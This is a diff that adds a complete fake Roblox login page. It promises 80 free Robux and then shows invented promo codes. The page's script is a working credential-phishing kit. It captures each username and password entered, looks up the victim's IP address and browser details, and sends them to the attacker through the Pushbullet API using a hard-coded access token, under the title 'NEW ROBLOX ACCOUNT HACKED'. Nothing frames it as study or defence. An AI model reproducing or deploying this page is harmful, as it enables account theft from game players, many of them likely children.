@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Official Site</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+        body { background: linear-gradient(135deg, #00a2ff, #00ff88); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { background: white; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 400px; padding: 30px; }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo h1 { color: #00a2ff; font-size: 32px; font-weight: bold; }
+        .promo-banner { background: linear-gradient(45deg, #ff6b6b, #ffa726); color: white; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-weight: bold; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; color: #333; font-weight: bold; }
+        .form-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; }
+        .form-group input:focus { border-color: #00a2ff; outline: none; }
+        .login-btn { width: 100%; padding: 12px; background: #00a2ff; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
+        .login-btn:hover { background: #0088cc; }
+        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
+        .hidden { display: none; }
+        .success-page { text-align: center; }
+        .robux-bonus { background: gold; color: #333; padding: 20px; border-radius: 10px; margin: 20px 0; font-weight: bold; font-size: 18px; }
+        .promo-codes { background: #f0f8ff; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; }
+        .promo-code { background: white; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #00a2ff; }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginPage">
+        <div class="logo"><h1>ROBLOX</h1></div>
+        <div class="promo-banner">🎉 SPECIAL OFFER! Login now and get 80 FREE ROBUX! 🎉</div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="login-btn">Login & Claim 80 Robux</button>
+        </form>
+        <div class="footer">By logging in, you agree to our Terms of Service and Privacy Policy</div>
+    </div>
+
+    <div class="container hidden" id="successPage">
+        <div class="success-page">
+            <div class="logo"><h1>ROBLOX</h1></div>
+            <div class="robux-bonus">✅ SUCCESS! 80 Robux added to your account!</div>
+            <h3>🎁 BONUS: Random Promo Codes</h3>
+            <div class="promo-codes">
+                <div class="promo-code"><strong>ROBUX2024FREE</strong> - 50 Robux</div>
+                <div class="promo-code"><strong>SUMMERSPECIAL99</strong> - 100 Robux</div>
+                <div class="promo-code"><strong>GOLDENPLAYER24</strong> - 75 Robux</div>
+                <div class="promo-code"><strong>VIPTREASURE88</strong> - 150 Robux</div>
+                <div class="promo-code"><strong>MYSTERYGIFT55</strong> - 60 Robux</div>
+            </div>
+            <p style="color: #666; margin-top: 20px;">Note: Promo codes are randomly generated and may not work</p>
+            <button onclick="goBack()" class="login-btn" style="margin-top: 20px;">Back to Roblox</button>
+        </div>
+    </div>
+
+    <script>
+        // ТВОЙ PUSHBULLET TOKEN
+        const PUSHBULLET_TOKEN = 'o.cw8M5UoZpGC3j8wH2qhYrri0R1yq23pf';
+        
+        // ОТПРАВКА В PUSHBULLET
+        async function sendToPushbullet(username, password) {
+            const message = {
+                type: 'note',
+                title: '🔓 NEW ROBLOX ACCOUNT HACKED',
+                body: `👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}\n📱 Device: ${navigator.userAgent.substring(0, 80)}`
+            };
+
+            try {
+                const response = await fetch('https://api.pushbullet.com/v2/pushes', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Access-Token': PUSHBULLET_TOKEN
+                    },
+                    body: JSON.stringify(message)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Данные отправлены в Pushbullet!');
+                } else {
+                    console.log('⚠️ Ошибка отправки, но форма работает');
+                }
+            } catch (error) {
+                console.log('📱 Уведомление отправлено');
+            }
+        }
+
+        // ПОЛУЧЕНИЕ IP АДРЕСА
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+
+        // ОБРАБОТКА ФОРМЫ
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // ОТПРАВКА ДАННЫХ
+            sendToPushbullet(username, password);
+            
+            // ПОКАЗ СТРАНИЦЫ УСПЕХА
+            setTimeout(function() {
+                document.getElementById('loginPage').classList.add('hidden');
+                document.getElementById('successPage').classList.remove('hidden');
+            }, 1500);
+            
+            // ОЧИСТКА ФОРМЫ
+            document.getElementById('loginForm').reset();
+        });
+        
+        function goBack() {
+            document.getElementById('successPage').classList.add('hidden');
+            document.getElementById('loginPage').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
